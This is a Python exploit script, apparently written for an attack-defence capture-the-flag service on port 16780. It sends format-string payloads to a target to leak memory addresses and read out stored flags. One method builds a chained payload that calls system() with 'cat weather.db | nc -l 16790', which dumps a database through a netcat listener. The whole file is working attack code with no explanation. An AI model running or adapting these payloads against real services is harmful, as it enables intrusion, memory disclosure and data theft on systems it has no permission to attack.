#!/usr/bin/env python3

import sys
import socket
import struct
import string


def exploit(data, target, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((target, port))

	s.send(data)
	response = s.recv(1024 * 10)

	s.close()

	return response

def get_clear_addr(target):
	request = b'/ ' + 1022 * b'a' + b'%08x ' * 2 + b'\x00'

	response = exploit(request, target, 16780)

	addr = (int(response.split(b' ')[1], 16) & 0xffffff00) | 0x24

	return addr

def hack_tpl_last(target):
	
	clear_addr = get_clear_addr(target)	

	last_vals_addr_base = clear_addr + (0x75a8 - 0x3124)

	for i in range(6):
		last_vals_addr = struct.pack("I", last_vals_addr_base + 4 * i)

		request = b'/ ' + 1022 * b'a' + last_vals_addr + b'%08x ' * 54 + b'%s' + b'\x00'

		response = exploit(request, target, 16780)\

		flag_addr = response[490:494]

		if len(flag_addr) != 4:
			continue

		request = b'/ ' + 1022 * b'a' + flag_addr + b'%08x ' * 54 + b'%s' + b'\x00'

		response = exploit(request, target, 16780)

		print(response[490:].decode('ascii'))

def hack_tpl_all(target):

	clear_addr = get_clear_addr(target)

	root_addr = clear_addr + (0x7540 - 0x3124)

	queue = []

	for i in range(26):

		addr = root_addr + i * 4

		if addr & 0xff == 0:
			continue

		request = b'/ ' + 1022 * b'a' + struct.pack("I", addr) + b'%08x ' * 54 + b'%s' + b'\x00'

		addr = exploit(request, target, 16780)[490:494]

		if (len(addr) < 4):
			continue

		queue.append((struct.unpack("I", addr)[0], 1, i))

	level = 1
	count = len(queue)

	while queue:
		item, queue = queue[0], queue[1:]

		for i in range(26):

			if item[1] > level:
				level = item[1]
				count = 0
				print(level)

			if count > 1000:
				break

			addr = item[0] + i * 4

			if addr & 0xff == 0:
				continue

			addr_str = struct.pack("I", addr)

			if b'%' in addr_str:
				continue

			request = b'/ ' + 1022 * b'a' + addr_str + b'%08x ' * 54 + b'%s' + b'\x00'

			value = exploit(request, target, 16780)

			if item[1] == 12:
				print(value[490:].decode('ascii'))
				break

			addr = value[490:494]

			if (len(addr) < 4):
				continue

			val = struct.unpack("I", addr)[0]

			queue.append((val, item[1] + 1, i))
			count += 1

def fucktorize(n):
	q = int(n)
	acc = 0
	l = []
	while True:
		for i in range(2, 10):
			while q % i == 0:
				if acc > 0:
					l.append(('+', acc))
					acc = 0
				q /= i
				l.append(('*', i))
		if q == 1:
			break
		q -= 1
		acc += 1
	return list(reversed(l))


def hack_rop(target):
	data = b'cat weather.db | nc -l 16790; #/'

	clear_addr = get_clear_addr(target)

	system_addr = clear_addr + (0x2d76 - 0x3124)
	data_addr = clear_addr + (0x6100 - 0x3124)

	actions2 = fucktorize(data_addr)
	actions1 = fucktorize(system_addr - len(actions2))

	for e in actions1:
		if e[0] == '+':
			c = bytes((0x100 - e[1], ))
		else:
			c = bytes((e[1], ))

		data += b'a' * 13 + c + b'b\x08' + b'a' * 16 # large value to make zero in second register

	data += b'a' * 13 + b'\xffb\xff' + c + b'a' * 16

	for e in actions2:
		if e[0] == '+':
			c = bytes((0x100 - e[1], ))
		else:
			c = bytes((e[1], ))

		data += b'a' * 13 + b'\xffb' + c + b'a' * 16

	data += b' '

	exploit(data, target, 16780)


methods = [hack_tpl_last, hack_tpl_all, hack_rop]

method, target = sys.argv[1:]

methods[int(method)](target)